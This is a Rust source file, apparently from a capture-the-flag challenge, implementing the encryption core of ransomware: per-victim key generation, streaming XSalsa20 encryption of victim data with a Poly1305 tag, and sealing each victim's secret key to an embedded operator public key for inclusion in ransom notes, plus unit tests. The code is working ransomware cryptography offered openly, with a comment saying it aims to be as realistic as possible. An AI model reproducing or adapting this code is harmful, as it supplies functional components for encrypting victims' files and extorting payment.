use std::io::Read;

use bs58;
use dryoc::auth::Auth;
use dryoc::dryocbox;
use dryoc::dryocbox::DryocBox;
use dryoc::kdf;
use dryoc::onetimeauth;
use dryoc::onetimeauth::OnetimeAuth;
use dryoc::types::MutByteArray;
use dryoc::types::{ByteArray, NewByteArray};
use salsa20::cipher::{KeyIvInit, StreamCipher};
use salsa20::XSalsa20;
use sha2::{Digest, Sha256};
use uuid::Uuid;
use zeroize::Zeroize;
use zeroize::Zeroizing;

const BLOCK_SIZE: usize = 1024 * 1024;
static OPERATOR_PUBLIC_KEY: &'static [u8; 32] = include_bytes!("../assets/operator_public_key.bin");

#[derive(Clone, Debug, PartialEq)]
pub struct PerVictimKey {
    victim_id: Uuid,
    keypair: dryocbox::KeyPair,
}

impl std::ops::Deref for PerVictimKey {
    type Target = dryocbox::KeyPair;
    fn deref(&self) -> &Self::Target {
        &self.keypair
    }
}

impl PerVictimKey {
    fn new(victim_id: &Uuid, secret_key: dryocbox::SecretKey) -> Self {
        Self {
            victim_id: victim_id.clone(),
            keypair: dryocbox::KeyPair::from_secret_key(secret_key),
        }
    }
    pub fn generate(victim_id: &Uuid) -> Self {
        Self::new(&victim_id, dryocbox::SecretKey::gen())
    }
    pub fn dump(self: &Self) -> Zeroizing<Vec<u8>> {
        // Note: with_capacity is important! Otherwise we may fail to zeroize all copies of the key.
        let mut ret: Zeroizing<Vec<u8>> =
            Vec::with_capacity(self.victim_id.as_bytes().len() + self.secret_key.len()).into();
        ret.extend_from_slice(self.victim_id.as_bytes());
        ret.extend_from_slice(&self.secret_key);
        ret
    }
    pub fn parse(data: &[u8]) -> Option<Self> {
        if data.len() != 48 {
            return None;
        }
        let victim_id = data[0..16].try_into().ok()?;
        let secret_key = data[16..48].try_into().ok()?;
        Some(Self::new(&Uuid::from_bytes(victim_id), secret_key))
    }
    /// For use in ransom notes.
    pub fn seal_for_operator(&self) -> String {
        // Compute a HMAC with the encryption key as secret and the victim ID as message.
        // In case the same ransomware is dropped on a machine multiple times, the operator
        // should not demand for multiple payments. However with the current architecture we
        // would generate different secret keys for different runs.
        // The proof could be used to verify that multiple secret keys belong to the same victim.
        // This likely does not matter at all: we are authoring a CTF, not a real ransomware,
        // but we want to make it as realistic as possible.
        let identity_proof =
            Auth::compute_to_vec(self.secret_key.clone(), &self.victim_id.as_bytes());
        let kdf = kdf::Kdf::from_parts(self.secret_key.clone(), kdf::Context::default());
        let mut ekp_seed: [u8; 32] = kdf.derive_subkey(2).unwrap();
        let ephemeral_key = dryocbox::KeyPair::from_seed(&ekp_seed);
        let mut nonce = dryocbox::Nonce::new_byte_array();
        crypto_box_seal_nonce(
            &mut nonce,
            &ephemeral_key.public_key,
            &OPERATOR_PUBLIC_KEY.into(),
        );
        let mut sealed = ephemeral_key.public_key.to_vec();
        sealed.append(
            &mut DryocBox::encrypt_to_vecbox(
                &self.secret_key,
                &nonce,
                &OPERATOR_PUBLIC_KEY.into(),
                &ephemeral_key.secret_key,
            )
            .unwrap()
            .to_vec(),
        );
        ekp_seed.zeroize();
        format!(
            "{}:{}:{}",
            self.victim_id,
            bs58::encode(&identity_proof).into_string(),
            bs58::encode(&sealed).into_string()
        )
    }
}

fn crypto_box_seal_nonce(
    nonce: &mut dryocbox::Nonce,
    epk: &dryocbox::PublicKey,
    rpk: &dryocbox::SecretKey,
) {
    use dryoc::classic::crypto_generichash::{
        crypto_generichash_final, crypto_generichash_init, crypto_generichash_update,
    };
    let mut state = crypto_generichash_init(None, 24).expect("state");
    crypto_generichash_update(&mut state, epk);
    crypto_generichash_update(&mut state, rpk);
    crypto_generichash_final(state, nonce).expect("hash error");
}

pub struct EncryptedStreamHeader {
    sk_sha256: [u8; 32],
    epk: dryocbox::PublicKey,
    tag: [u8; 16],
}

impl EncryptedStreamHeader {
    pub fn to_vec(self: &Self) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&self.sk_sha256);
        v.extend_from_slice(self.epk.as_array());
        v.extend_from_slice(&self.tag);
        v
    }
}

pub fn encrypt_stream(
    key: &PerVictimKey,
    input: &mut impl std::io::Read,
    output: &mut impl std::io::Write,
) -> std::io::Result<EncryptedStreamHeader> {
    // This is basically hand-rolled dryoc::dryocbox::Box, but works on stream.
    let ephemeral_key = dryocbox::KeyPair::gen();
    let mut header = EncryptedStreamHeader {
        sk_sha256: Sha256::digest(&key.secret_key.as_array()).into(),
        epk: ephemeral_key.public_key.clone(),
        tag: [0; 16],
    };
    let mut shared_key = dryoc::classic::crypto_box::crypto_box_beforenm(
        key.public_key.as_array(),
        ephemeral_key.secret_key.as_array(),
    );
    let mut nonce = dryocbox::Nonce::new();
    crypto_box_seal_nonce(&mut nonce, &ephemeral_key.public_key, &key.public_key);
    let mut cipher = XSalsa20::new(&shared_key.into(), nonce.as_array().into());
    shared_key.zeroize();
    let mut mackey = onetimeauth::Key::new();
    cipher.apply_keystream(mackey.as_mut_array());
    let mut hash = OnetimeAuth::new(mackey);
    let mut buf: Vec<u8> = Vec::with_capacity(BLOCK_SIZE);
    loop {
        buf.clear();
        let n = input.take(BLOCK_SIZE as u64).read_to_end(&mut buf)?;
        if n == 0 {
            break;
        }
        cipher.apply_keystream(&mut buf);
        hash.update(&buf);
        output.write_all(&buf)?;
    }
    header.tag = hash.finalize();

    Ok(header)
}

#[cfg(test)]
fn decrypt_stream(
    key: &PerVictimKey,
    header: &EncryptedStreamHeader,
    input: &mut impl std::io::Read,
    output: &mut impl std::io::Write,
) -> std::io::Result<()> {
    if Sha256::digest(key.secret_key.as_array()) != header.sk_sha256.into() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Wrong secret key",
        ));
    }
    let mut shared_key = dryoc::classic::crypto_box::crypto_box_beforenm(
        header.epk.as_array(),
        key.secret_key.as_array(),
    );
    let mut nonce = dryocbox::Nonce::new();
    crypto_box_seal_nonce(&mut nonce, &header.epk, &key.public_key);
    let mut cipher = XSalsa20::new(&shared_key.into(), nonce.as_array().into());
    shared_key.zeroize();
    let mut mackey = onetimeauth::Key::new();
    cipher.apply_keystream(mackey.as_mut_array());
    let mut hash = OnetimeAuth::new(mackey);
    let mut buf: Vec<u8> = Vec::with_capacity(BLOCK_SIZE);
    loop {
        buf.clear();
        let n = input.take(BLOCK_SIZE as u64).read_to_end(&mut buf)?;
        if n == 0 {
            break;
        }
        hash.update(&buf);
        cipher.apply_keystream(&mut buf);
        output.write_all(&buf)?;
    }
    hash.verify(&header.tag)
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "Invalid tag"))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_seal_per_victim_key() {
        let key = super::PerVictimKey::new(
            &uuid::uuid!("01234567-89ab-cdef-0123-456789abcdef"),
            [0; 32].into(),
        );
        assert_eq!(
            key.seal_for_operator(),
            "01234567-89ab-cdef-0123-456789abcdef:6M1m2bucY4682YNiteZ3mCfkMhzmS1ygec8DV2nLtdrS:zTLxgEp5TKuaVf7oRRuF3TkubA3Th87jhVa9kgU3c5AAsvzw4VusXTHgJBTRbmQDNFKBk5NgfKbXdsRgsNhu1eCHUbrgYuTqAjyogdrnmPXvA"
        );
    }
    #[test]
    fn test_stream_round_trip() {
        let key = PerVictimKey::generate(&uuid::uuid!("01234567-89ab-cdef-0123-456789abcdef"));
        let mut input = std::io::Cursor::new(vec![0x11; 1379]);
        let mut output = std::io::Cursor::new(Vec::new());
        let header = encrypt_stream(&key, &mut input, &mut output).unwrap();
        assert_eq!(output.position(), 1379);
        let mut input = std::io::Cursor::new(output.into_inner());
        let mut output = std::io::Cursor::new(Vec::new());
        decrypt_stream(&key, &header, &mut input, &mut output).unwrap();
        assert_eq!(output.into_inner(), vec![0x11; 1379])
    }
    #[test]
    fn test_per_victim_key_dump_parse() {
        let key = PerVictimKey::generate(&uuid::uuid!("01234567-89ab-cdef-0123-456789abcdef"));
        let dumped = key.dump();
        let parsed = PerVictimKey::parse(&dumped).unwrap();
        assert_eq!(key, parsed);
    }
}
